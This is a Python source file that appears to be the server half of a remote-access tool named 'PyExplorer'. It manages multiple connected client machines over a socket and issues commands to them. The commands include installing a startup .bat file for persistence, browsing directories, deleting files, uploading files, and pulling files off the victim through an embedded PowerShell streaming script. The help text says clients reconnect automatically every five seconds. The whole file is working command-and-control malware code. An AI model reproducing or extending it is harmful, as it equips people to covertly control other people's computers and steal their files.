import socket
import time
import colorama
from threading import Thread
from colorama import Fore, Back, Style

colorama.init(autoreset=True)

PORT = 12345
BUFFER_SIZE = 4096

CLIENT_LIST = []
CLIENT_DICT = {}
CLIENT_DICT_CTR = 0
listener_thread_stat = True

SIG = "<<PyExplorer>>"

class Connection:

    def __init__(self, new_socket, new_client):
        self.client_socket = new_socket
        self.client_ip = new_client
        self.cwd = ''


def listener():
    # Initialize socket and listen
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', PORT))
    print(Fore.YELLOW + "\n[+] Socket bound to port", PORT)
 
    server_socket.listen(5)
    print(Fore.YELLOW + "[+] Server is listening...")

    while listener_thread_stat:
        # Connection established
        client_socket, client_address = server_socket.accept()
        
        newConnection = Connection(client_socket, client_address)
        
        
        global CLIENT_DICT_CTR
        CLIENT_LIST.append(client_address)
        CLIENT_DICT[str(CLIENT_DICT_CTR)] = newConnection
        
        print(Fore.LIGHTGREEN_EX + '\n[+] Connection to {}:{} established\n'.format(client_address, CLIENT_DICT_CTR))
        
        CLIENT_DICT_CTR += 1
        
        print(Fore.LIGHTCYAN_EX + SIG + " ", end='')

    server_socket.close()
    print(Fore.YELLOW + "\n[+] Listener stopped.")


# Print help menu
def helpMenu():
    print("""
Help Menu
##############

Command Format
----------------------------------------------------------------------------------------------
client_number command

EX.
-------
0 dir
-------
This send the "dir" command to the client at the 0 index in the CLIENT_DICT.


Commands
----------------------------------------------------------------------------------------------
> help / h : Display this menu.

> quit / q : Quit the server, client will try to reconnect every 5 seconds.

> startup : Add .bat file to the startup folder on the client machine that calls the client script on startup.

> dir : Print contents of current working directory.

> cd : Change directory.

> read fileName n : Send n number of lines from file at specified path, leave n blank to see the whole file.

> download fileName : Downloads specified file.

> upload fileName : Upload specified file to client machine.

----------------------------------------------------------------------------------------------
    """)

# Quit the server program. Client will try to reconnect every 5 seconds
def quitServer():
    global listener_thread_stat
    listener_thread_stat = False
    
    for client in CLIENT_DICT:    
        CLIENT_DICT[client].client_socket.send(b"q")
    
    print("Sending exit signal to client.")


def listClients():
    ctr = 0
    for client in CLIENT_DICT:
        print("{}. {}".format(ctr, CLIENT_DICT[client].client_ip))
        ctr += 1

# Add to startup folder
def addToStartup(client_number):
    print("Adding to startup folder...")
    CLIENT_DICT[client_number].client_socket.send(b"startup")
    print(CLIENT_DICT[client_number].client_socket.recv(BUFFER_SIZE).decode()) 

# Make directory
def makeDir(client_number, command):
    CLIENT_DICT[client_number].client_socket.send(command.encode())
    data = CLIENT_DICT[client_number].client_socket.recv(BUFFER_SIZE).decode()
    CLIENT_DICT[client_number].client_socket.send(b"OK")
    data = CLIENT_DICT[client_number].client_socket.recv(BUFFER_SIZE).decode()

# Remove directory or file
def removeDir(client_number, command):
    CLIENT_DICT[client_number].client_socket.send(command.encode())
    data = CLIENT_DICT[client_number].client_socket.recv(BUFFER_SIZE).decode()

# List directory
def listDir(client_number, command):
    list_dir = ''
    CLIENT_DICT[client_number].client_socket.send(command.encode())
    data = CLIENT_DICT[client_number].client_socket.recv(BUFFER_SIZE).decode()
    
    while data != "Fin":
        list_dir += data
        CLIENT_DICT[client_number].client_socket.send(b"OK")

        data = CLIENT_DICT[client_number].client_socket.recv(BUFFER_SIZE).decode()
            
    print(list_dir)

# Change current working directory
def changeDir(client_number, command):
    CLIENT_DICT[client_number].client_socket.send(command.encode())
    
    CLIENT_DICT[client_number].cwd = CLIENT_DICT[client_number].client_socket.recv(BUFFER_SIZE).decode()

# Send data from file specified without saving it to a new file on the server
def read(client_number, proc_command):
    try:
        file_name, line_count = proc_command.rsplit(' ', 1)
        
    except IndexError:
        return 1
        
    except ValueError:
        line_count = -1
        file_name = proc_command
        pass
        
    peek_command = "gc {} -TotalCount {}".format(file_name, line_count)
    CLIENT_DICT[client_number].client_socket.send(peek_command.encode())

    try:
        data = CLIENT_DICT[client_number].client_socket.recv(BUFFER_SIZE).decode()
    except UnicodeDecodeError:
        print(Fore.LIGHTRED_EX + "Error reading file.")
        CLIENT_DICT[client_number].client_socket.send(b"ERROR")

        return 1
        
    print("Preview of {}".format(proc_command))
    print("--------------------------------")
    
    while data != "Fin":
        print(data)
        
        CLIENT_DICT[client_number].client_socket.send(b"OK")
        
        data = CLIENT_DICT[client_number].client_socket.recv(BUFFER_SIZE).decode()
        
    print("--------------------------------")

# Download specified file
def download(client_number, raw_command):
    chunk_ctr = 0
    
    command = raw_command.split(' ', 1)
    raw_file_name = command[1]
    file_name = command[1]
    f_name = '"{}"'.format(file_name)

    if '\\' in file_name:
        file_name = file_name.split('\\')
        file_name = file_name[len(file_name)-1]

    copy_text = " - COPY"
    
    try:
        file_name, extention = file_name.rsplit('.', 1)
        
    except ValueError:
        extention = ''
        return 1
        
    file_name = file_name + copy_text + '.' + extention
    
    CLIENT_DICT[client_number].client_socket.send(raw_command.encode())

    data = CLIENT_DICT[client_number].client_socket.recv(BUFFER_SIZE).decode()
    if data != "OK":
        return 1

    # Powershell script to stream bytes from a file
    ps_read_file = f"""
    $chunkSize = {BUFFER_SIZE}
    $path = {f_name}
    $sourceStream = [System.IO.File]::OpenRead($path)

    try {{
        $buffer = New-Object byte[] $chunkSize
        while (($bytesRead = $sourceStream.Read($buffer, 0, $buffer.Length)) -gt 0) {{
            [Console]::OpenStandardOutput().Write($buffer, 0, $bytesRead)
        }}
    }}
    finally {{
        $sourceStream.Close()
    }}
    """

    CLIENT_DICT[client_number].client_socket.send(ps_read_file.encode())

    chunks = CLIENT_DICT[client_number].client_socket.recv(BUFFER_SIZE).decode()

    try:
        chunks = int(chunks)
        chunks += 1
    except Exception as e:
        print(e)
        return 1

    CLIENT_DICT[client_number].client_socket.send(b"OK")
        
    data = CLIENT_DICT[client_number].client_socket.recv(BUFFER_SIZE)

    start_time = time.time()

    with open(file_name, "wb") as f:
        while data != b"Fin":
            chunk_ctr += 1
            
            f.write(data)
            
            percentage = int((chunk_ctr / chunks) * 100)
            print("Download: {}%".format(percentage), end='\r')
                
            CLIENT_DICT[client_number].client_socket.send(b"OK")
           
            data = CLIENT_DICT[client_number].client_socket.recv(BUFFER_SIZE)

            
    percentage = int((chunk_ctr / chunks) * 100)
    print("Download: {}%".format(percentage))
    print("\nSuccess.\n-------------------")
    print("Downloaded in %s seconds" % (time.time() - start_time))
    print("File created in the same directory as this script.")


def upload(client_number, command):
    data = b'^_^'
    proc_command = command.split(' ', 1)
    
    try:
        path = proc_command[1]
    except IndexError:
        print(Fore.YELLOW + "No path found.")
        return 1
    
    CLIENT_DICT[client_number].client_socket.send(command.encode())
    
    try: 
        with open(proc_command[1], "rb") as input_file:
            chunk = input_file.read(BUFFER_SIZE)
                        
            while chunk != b'':
                CLIENT_DICT[client_number].client_socket.send(chunk)
            
                response = CLIENT_DICT[client_number].client_socket.recv(BUFFER_SIZE)
                if response != b"OK":
                    print(Fore.LIGHTRED_EX + "Error Transferring File.")
                    CLIENT_DICT[client_number].client_socket.send(b"Fin")
                    
                    break
            
                chunk = input_file.read(BUFFER_SIZE)
            
            CLIENT_DICT[client_number].client_socket.send(b"Fin")
                
    except FileNotFoundError:            
        print(Fore.YELLOW + "File not found.")
        CLIENT_DICT[client_number].client_socket.send(b"Fin")
        

def main():
    listener_thread = Thread(target=listener)
    listener_thread.setDaemon = True
    listener_thread.start()
        
    global CLIENT_DICT_CTR
    

    while True:
        error= False
        client_numbers = []
        try:
            print(Fore.LIGHTCYAN_EX + SIG + " ", end='')
            raw_command = input("")


            if raw_command == "q" or raw_command == "quit":
                quitServer()
                
                break

            elif raw_command == "h" or raw_command == "help":
                helpMenu()

            elif raw_command == "l" or raw_command == "list":
                listClients()


            try:
                pre_proc_command = raw_command.split(" ", 1)
                client_number = pre_proc_command[0]
                if client_number != "all":
                    try:
                        client_numbers = client_number.split(",")
                    except Exception as e:
                        client_numbers.append(client_number)
                        print(e)
                        
                    for client in client_numbers:
                        try:
                            if int(client) < 0 or int(client) > CLIENT_DICT_CTR-1:
                                error = True
                                break
                        except ValueError:
                            error = True
                    if error:
                        continue
                
                elif client_number == "all":
                    ctr = 0
                    while ctr < CLIENT_DICT_CTR:
                        client_numbers.append(str(ctr))
                        ctr += 1
                
                command = pre_proc_command[1]
                proc_command = command.split(' ', 1)
            except IndexError:
                continue
                
            for client in client_numbers:

                if raw_command == "startup":
                    addToStartup(client)

                elif proc_command[0] == "mkdir":
                    makeDir(client, command)

                elif proc_command[0] == "rmdir" or proc_command[0] == "rm":
                    removeDir(client, command)

                elif proc_command[0] == "dir":
                    listDir(client, command)

                elif proc_command[0] == "cd":
                    changeDir(client, command)

                elif proc_command[0] == "read":
                    read(client, proc_command[1])

                elif proc_command[0] == "download" or proc_command[0] == "dl":
                    download(client, command)
                
                elif proc_command[0] == "upload" or proc_command[0] == "ul":
                    upload(client, command)
                
        except (ConnectionResetError, ConnectionAbortedError) as e:
            print(Fore.LIGHTRED_EX + "Client disconnected.")
            print(e)
            try:
                CLIENT_DICT[client_number].client_socket.close()
                
                del CLIENT_DICT[client_number]
                CLIENT_DICT_CTR -= 1

            except Exception as e:
                print(e)
                
            continue
main()
